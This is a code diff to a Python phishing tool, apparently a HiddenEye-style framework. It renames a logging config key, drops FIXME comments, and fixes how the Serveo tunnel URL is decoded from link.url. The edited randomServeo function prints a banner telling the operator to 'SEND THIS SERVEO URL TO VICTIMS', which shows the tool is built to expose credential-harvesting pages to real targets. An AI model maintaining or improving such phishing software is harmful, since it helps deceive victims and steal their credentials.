@@ -17,11 +17,11 @@ ConfigurationManager.confirmSettingsExistence()
 config = ConfigurationManager.readConfig()
 
 logFile = None
-didBackground = config.get("Settings", "DidBackground")
+didBackground = config.get("Settings", "logger")
 for arg in argv:
     if arg == "--nolog":  # If true - don't log
         didBackground = False
-if config.get("Settings", "DidBackground") == "True":
+if config.get("Settings", "logger") == "True":
     logFile = open("log.txt", "w")
 
 colorTheme = ThemesManager.selectTheme() #FIXME
@@ -447,14 +447,14 @@ class ServerManager:
         choice = input("\n\n{0}YOUR CHOICE >>> {1}".format(MAIN0, MAIN2))
         system('clear')
         if choice == '1':
-            ServerManager.customServeo(port)  # FIXME
+            ServerManager.customServeo(port)
         elif choice == '2':
-            ServerManager.randomServeo(port)  # FIXME
+            ServerManager.randomServeo(port)
         else:
             system('clear')
             return ServerManager.runServeo(port)
 
-    def customServeo(port): #FIXME
+    def customServeo(port):
 
         print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -472,8 +472,7 @@ class ServerManager:
         try:
             output = check_output(
                 "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
-            # FIXME pylint(BAD STR STRIP CALL)
-            URL = str(output).strip("b ' \ n r")
+            URL = output.decode("UTF-8")
             system('clear')
             print('''
             {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -490,9 +489,9 @@ class ServerManager:
             '''.format(MAIN0, MAIN4))
             sleep(4)
             system('clear')
-            return ServerManager.customServeo(port)  # FIXME
+            return ServerManager.customServeo(port)
 
-    def randomServeo(port): #FIXME
+    def randomServeo(port):
         system('clear')
         print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -505,7 +504,7 @@ class ServerManager:
         try:
             output = check_output(
                 "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
-            URL = str(output).strip("b ' \ n r")  # FIXME
+            URL = output.decode("UTF-8")
             print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(
                 MAIN0, MAIN4, MAIN3, port) + URL + "{}".format(MAIN0))
             print("\n")
@@ -522,7 +521,7 @@ class EssentialsManager:
         [{1}*{0}] SELECT ANY ONE MODE...{0}\n--------------------------------'''.format(MAIN0, MAIN2))
 
     def writeLog(ctx):  # noQA
-        if config.get("Settings", "DidBackground") == "True":  # if didBackground == True, write
+        if config.get("Settings", "logger") == "True":  # if logger == True, write
             logFile.write(ctx.replace(MAIN0, "").replace(MAIN1, "").replace(
                 MAIN2, "").replace(MAIN3, "").replace(MAIN4, "") + "\n")
         print(ctx)
